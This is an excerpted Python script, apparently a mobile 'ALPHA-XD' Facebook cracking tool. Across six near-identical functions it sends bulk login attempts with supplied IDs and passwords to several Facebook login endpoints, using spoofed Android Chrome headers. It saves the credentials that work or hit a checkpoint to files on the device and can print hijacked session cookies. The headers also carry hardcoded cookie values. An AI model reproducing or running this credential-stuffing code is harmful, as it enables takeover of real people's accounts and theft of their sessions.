...
#open source by ALPHA-XD
#github= Thr-tech
# fb id https://m.facebook.com/Jeneshofficia13
...
os.system("xdg-openhttps://m.facebook.com/Jeneshofficia13")
#app  check 
...
\x1b[1;90m[+]==============================================
\x1b[1;97m[+] CREATED BY   :  HKN HKH
\033[1;31m[+] FB GROUP     :   AVAILABLE 
\033[1;33m[+] ON GITHUB    :  
\033[1;32m[+] TOOL STATUS  :  R4ND0M FREE
\033[1;35m[+] TOOL VIRSION :  10.00
[+]=============================================="""
...
def xerx():
    ...
    elif aryan =='7':os.system("xdg-open https://m.facebook.com/aaryan.chaudhary69")
    else:
...
def xerx1():
	...
	print('[?] Ids saved in ALPHA-XD-OK.txt,ALPHA-XD-CP.txt')
...
def mbasic(uid,pwx,tl):
    ...
    # 'cookie': 'datr=WKUvZjvcj_U2Kn0k1VGu7Fx-; sb=WKUvZmeFwNvgXpDuCaOaO0ik; locale=en_US; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2482%3Btimestamp%3A1714402845; vpd=v1%3B751x412x2.101494073867798; m_pixel_ratio=2.101494073867798; wd=515x938; fr=0IiGEELGXKrJirdAs.AWXh8YW99TrtJ_9M5uhuIyKk4Lw.BmL6VY..AAA.0.0.BmL7cu.AWVTFrea5rU',
    'dpr': '2.625',
    'referer': 'https://mbasic.facebook.com/?zero_e=2&zero_et=1714403175&_rdc=1&_rdr&wtsid=rdr_0gWRu3347rlAidTp2&refsrc=deprecated',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-G965F"',
    ...
    'viewport-width': '980',
			...
			lo = session.get('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[ALPHA-XD-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
					print("\33[1;92m[🌹] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/ALPHA-XD-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[ALPHA-XD-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ALPHA-XD-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/ALPHA-XD-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-ALPHA-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=WKUvZjvcj_U2Kn0k1VGu7Fx-; sb=WKUvZmeFwNvgXpDuCaOaO0ik; locale=en_US; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2482%3Btimestamp%3A1714402845; vpd=v1%3B751x412x2.101494073867798; m_pixel_ratio=2.101494073867798; wd=515x938; fr=0IiGEELGXKrJirdAs.AWXlEahYbMo-Pm-MAN-Z2Um3Yhg.BmL6VY..AAA.0.0.BmL7hM.AWUjZ4OL2qA',
    'dpr': '2.625',
    'referer': 'https://p.facebook.com/?zero_e=2&zero_et=1714403308&_rdc=1&_rdr&wtsid=rdr_0qNraP12ZEm3oqadw&refsrc=deprecated',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    ...
    'viewport-width': '980',
			...
			lo = session.get('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-ALPHA-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=WKUvZjvcj_U2Kn0k1VGu7Fx-; sb=WKUvZmeFwNvgXpDuCaOaO0ik; locale=en_US; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2482%3Btimestamp%3A1714402845; vpd=v1%3B751x412x2.101494073867798; m_pixel_ratio=2.101494073867798; wd=515x938; fr=0IiGEELGXKrJirdAs.AWU99LNxN8VODT63p3FFO__nuK8.BmL6VY..AAA.0.0.BmL7ik.AWUl6hwsapg',
    'dpr': '2.625',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    ...
    'viewport-width': '980',
			...
			lo = session.get('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-ALPHA-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=WKUvZjvcj_U2Kn0k1VGu7Fx-; sb=WKUvZmeFwNvgXpDuCaOaO0ik; locale=en_US; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2482%3Btimestamp%3A1714402845; vpd=v1%3B751x412x2.101494073867798; m_pixel_ratio=2.101494073867798; wd=515x938; fr=0IiGEELGXKrJirdAs.AWU7K7tEHhDh0Ib8ACJCrMDRRo8.BmL6VY..AAA.0.0.BmL7aG.AWUOuvNyohQ',
    'dpr': '2.625',
    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdUx_hpJH3GKdNLiXEFY1UGNVxqG3LKiL3OwWxpJwouzRpO4x1VPOOKG1UGn7HWmE82cc2fpzGwHe_WjxWOuFXABd8JF-Hmq--snKikWo0Dag&smuh=11545&lh=Ac9GH1NG6jC9Zbdj01U&wtsid=rdr_1ex1QyzOtkbKNaopN&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    ...
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'service-worker-navigation-preload': '{"k":"rev,1013116904;locale,en_US;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100035779313559;","a":"1714399025","t":31536000,"n":"ZQPf6WiB","v":"2482","p":4,"r":1013116904,"o":"h2","y":"wblt"}',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
			lo = session.get('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-ALPHA-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=WKUvZjvcj_U2Kn0k1VGu7Fx-; sb=WKUvZmeFwNvgXpDuCaOaO0ik; locale=en_US; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2482%3Btimestamp%3A1714402845; vpd=v1%3B751x412x2.101494073867798; m_pixel_ratio=2.101494073867798; wd=515x938; fr=0IiGEELGXKrJirdAs.AWUt5fCQ1L75VhuHjZOnIyesrFg.BmL6VY..AAA.0.0.BmL7mm.AWV21D0UhBI',
    'dpr': '2.625',
    'referer': 'https://m.facebook.com/?wtsid=rdr_0XooEjBzy7tQzsGQt',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    ...
    'viewport-width': '980',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-ALPHA-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=WKUvZjvcj_U2Kn0k1VGu7Fx-; sb=WKUvZmeFwNvgXpDuCaOaO0ik; locale=en_US; ps_n=1; ps_l=1; wl_cbv=v2%3Bclient_version%3A2482%3Btimestamp%3A1714402845; vpd=v1%3B751x412x2.101494073867798; m_pixel_ratio=2.101494073867798; wd=515x938; fr=0IiGEELGXKrJirdAs.AWUEZsiFqJnwHII2KfEj6yAbovk.BmL6VY..AAA.0.0.BmL7fr.AWWVcXQcPAI',
    'dpr': '2.625',
    'referer': 'https://d.facebook.com/?zero_e=2&zero_et=1714403308&_rdc=1&_rdr&wtsid=rdr_0qNraP12ZEm3oqadw&refsrc=deprecated',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    ...
    'viewport-width': '980',
			...
			lo = session.get('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-ALPHA-XD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
